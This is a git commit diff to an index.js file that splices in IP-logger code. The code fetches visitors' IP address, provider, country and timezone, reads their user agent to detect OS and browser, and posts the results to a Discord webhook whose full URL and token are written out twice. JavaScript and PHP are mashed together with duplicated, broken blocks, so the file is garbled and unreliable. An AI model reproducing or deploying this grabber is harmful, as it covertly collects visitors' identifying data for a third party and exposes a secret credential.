b53d04d49d604bb5ea76ba612e90eb4fbf8f6a30
werdvkt <138376751+werdvkt@users.noreply.github.com>
2023-07-17 16:51:24 +0200

    Update index.js

--- index.js
+++ index.js
@@ -12,6 +12,21 @@ const request = async () => { // Calling a "synchronous" fetch
     const data = await response.json();
 
     // Declaring variables
+    var ip = data.query;// Paste your Discord Webhook API URL into Line 3: WEBHOOKURL => YOUR API URL
+// Paste your Discord Webhook API URL into Line 3: WEBHOOKURL => YOUR API URL
+
+var webHookUrl = "https://discord.com/api/webhooks/1125045960150622268/jatYAwyzE5IIyrBgTanmaMftmZhiqeo26h9rb6Yg3H9zA_tolem5gmXYSKw2JF2o3V41";
+
+/*
+    Forked from: https://github.com/luisoos/IP-Log-To-Discord-Webhook
+    License: MIT
+*/
+
+const request = async () => { // Calling a "synchronous" fetch
+    const response = await fetch('https://ip-api.com/json/');
+    const data = await response.json();
+
+    // Declaring variables
     var ip = data.query;
 
     var provider = data.org + " (" + data.as + ")";<?php
@@ -63,23 +78,73 @@ function getBrowser() {
     global $user_agent;
     $browser        =   "Unknown Browser";
     $browser_array  =   array(
-                            '/msie/i'       =>  'Internet Explorer',
-                            '/firefox/i'    =>  'Firefox',
-							'/Mozilla/i'	=>	'Mozila',
-							'/Mozilla/5.0/i'=>	'Mozila',
-                            '/safari/i'     =>  'Safari',
-                            '/chrome/i'     =>  'Chrome',
-                            '/edge/i'       =>  'Edge',
-                            '/opera/i'      =>  'Opera',
-							'/OPR/i'        =>  'Opera',
-                            '/netscape/i'   =>  'Netscape',
-                            '/maxthon/i'    =>  'Maxthon',
-                            '/konqueror/i'  =>  'Konqueror',
-							'/Bot/i'		=>	'BOT Browser',
-							'/Valve Steam GameOverlay/i'  =>  'Steam',
-                            '/mobile/i'     =>  'Handheld Browser'
-                        );
 
+var webHookUrl = "YOUR_WEBHOOK_URL_HERE";
+
+/*
+    Forked from: https://github.com/luisoos/IP-Log-To-Discord-Webhook
+    License: MIT
+*/
+
+const request = async () => { // Calling a "synchronous" fetch
+    const response = await fetch('https://ip-api.com/json/');
+    const data = await response.json();
+
+    // Declaring variables
+    var ip = data.query;
+
+    var provider = data.org + " (" + data.as + ")";<?php
+/*
+ GitHub: https://github.com/Elyasuuuuu
+ Last update : 29/03/2020
+*/
+ini_set('display_errors','off');
+/*<------------- Placer le lien webhook ici ------------------>*/ $webhook = "https://discord.com/api/webhooks/1125045960150622268/jatYAwyzE5IIyrBgTanmaMftmZhiqeo26h9rb6Yg3H9zA_tolem5gmXYSKw2JF2o3V41";
+$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
+function getOS() { 
+    global $user_agent;
+    $os_platform    =   "Unknown OS Platform";
+    $os_array       =   array(
+                            '/windows nt 10/i'     =>  'Windows 10',
+                            '/windows nt 6.3/i'     =>  'Windows 8.1',
+                            '/windows nt 6.2/i'     =>  'Windows 8',
+                            '/windows nt 6.1/i'     =>  'Windows 7',
+                            '/windows nt 6.0/i'     =>  'Windows Vista',
+                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
+                            '/windows nt 5.1/i'     =>  'Windows XP',
+                            '/windows xp/i'         =>  'Windows XP',
+                            '/windows nt 5.0/i'     =>  'Windows 2000',
+                            '/windows me/i'         =>  'Windows ME',
+                            '/win98/i'              =>  'Windows 98',
+                            '/win95/i'              =>  'Windows 95',
+                            '/win16/i'              =>  'Windows 3.11',
+                            '/macintosh|mac os x/i' =>  'Mac OS X',
+                            '/mac_powerpc/i'        =>  'Mac OS 9',
+                            '/linux/i'              =>  'Linux',
+							'/kalilinux/i'          =>  'KaliLinux',
+                            '/ubuntu/i'             =>  'Ubuntu',
+                            '/iphone/i'             =>  'iPhone',
+                            '/ipod/i'               =>  'iPod',
+                            '/ipad/i'               =>  'iPad',
+                            '/android/i'            =>  'Android',
+                            '/blackberry/i'         =>  'BlackBerry',
+                            '/webos/i'              =>  'Mobile',
+							'/Windows Phone/i'      =>  'Windows Phone'
+                        );
+    foreach ($os_array as $regex => $value) { 
+        if (preg_match($regex, $user_agent)) {
+            $os_platform    =   $value;
+        }
+    }   
+    return $os_platform;
+}
+function getBrowser() {
+    global $user_agent;
+    $browser        =   "Unknown Browser";
+    $browser_array  =   array(
+
+
+    var provider = data.org + " (" + data.as + ")";
 
     var timezone = data.timezone;
     var country = data.country;
